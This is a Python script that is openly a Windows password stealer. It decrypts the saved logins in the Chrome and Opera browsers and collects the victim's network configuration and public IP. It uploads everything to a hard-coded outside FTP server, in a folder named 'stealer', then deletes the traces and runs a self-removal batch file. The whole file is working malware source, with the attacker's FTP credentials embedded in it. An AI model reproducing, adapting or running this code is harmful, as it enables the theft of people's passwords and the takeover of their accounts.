import os
import sqlite3
import win32crypt
import shutil
import subprocess
from pathlib import Path
from ftplib import FTP
import http.client

#Google passwords

def Chrome():
  Google = ' \n\n\n\n #### GOOGLE PASSWORDS #### \n\n\n\n'
  if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\google_done')

      connection = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\google_done')
      cursor = connection.cursor()
      cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
      for result in cursor.fetchall():
          password = win32crypt.CryptUnprotectData(result[2])[1].decode()
          login = result[1]
          url = result[0]
          if password != '':
            Google +='  [URL] ==>  ' + url + '  [LOGIN] ==> ' + login + '  [PASSWORD] ==> ' + password + '\n\n'
  return Google

file = open(os.getenv("APPDATA") + '\\Google.txt', "w+")
file.write(str(Chrome()))
file.close()

# Opera passwords

def Opera():
  Opera = ' \n\n\n\n #### OPERA PASSWORDS #### \n\n\n\n'
  if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
      shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')

      connection = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
      cursor = connection.cursor()
      cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
      for result in cursor.fetchall():
          password = win32crypt.CryptUnprotectData(result[2])[1].decode()
          login = result[1]
          url = result[0]
          if password != '':
            Opera +='  [URL] ==>  ' + url + '  [LOGIN] ==> ' + login + '  [PASSWORD] ==> ' + password + '\n\n'
  return Opera

file = open(os.getenv("APPDATA") + '\\Opera.txt', "w+")
file.write(str(Opera()))
file.close()

# mac address

def Mac():
   text = subprocess.check_output('ipconfig /all')
   decoded = text.decode('cp866')
   Path('~/AppData/Roaming/mac.txt').expanduser().write_text(decoded) 

# delete files

def delete_files():
  os.remove(Opera)
  os.remove(mac)
  os.remove(Google)
  os.remove(ip)

# delete done_files

def delete_done_files():
  try:
      os.remove(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
      print('')
  except FileNotFoundError:
      print('')
  finally:
    try:
        os.remove(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\google_done')
        print('')
    except FileNotFoundError:
        print('')


# ip

def ip():
  conn = http.client.HTTPConnection("ifconfig.me")
  conn.request("GET", "/ip")

  dir = os.getenv("APPDATA") + '\\ip.txt'

  ip = open(dir, 'wb')
  ip.write(conn.getresponse().read())
  ip.close()

# autoremove script

def auteromove():
  os.startfile(r"test.bat")


######## MAIN ########

ip()
Mac()
Opera()
Chrome()

ftp = FTP('rudy.zzz.com.ua')
ftp.login('skot11', 'Ljrevtyns1674')
ftp.cwd('/https-vk-com-group123-post34-photo1-png.kl.com.ua/stealer')

Google = os.getenv("APPDATA") + '\\Google.txt'
upload_file = open(Google, 'rb')
ftp.storbinary('STOR ' + 'Google.txt', upload_file)
upload_file.close()

Opera = os.getenv("APPDATA") + '\\Opera.txt'
upload_file = open(Opera, 'rb')
ftp.storbinary('STOR ' + 'Opera.txt', upload_file)
upload_file.close()

mac = os.getenv("APPDATA") + '\\mac.txt'
upload_file = open(mac, 'rb')
ftp.storbinary('STOR ' + 'mac.txt', upload_file)
upload_file.close()

ip = os.getenv("APPDATA") + '\\ip.txt'
upload_file = open(ip, 'rb')
ftp.storbinary('STOR ' + 'ip.txt', upload_file)
upload_file.close()

ftp.quit()

delete_files()
delete_done_files()
auteromove()

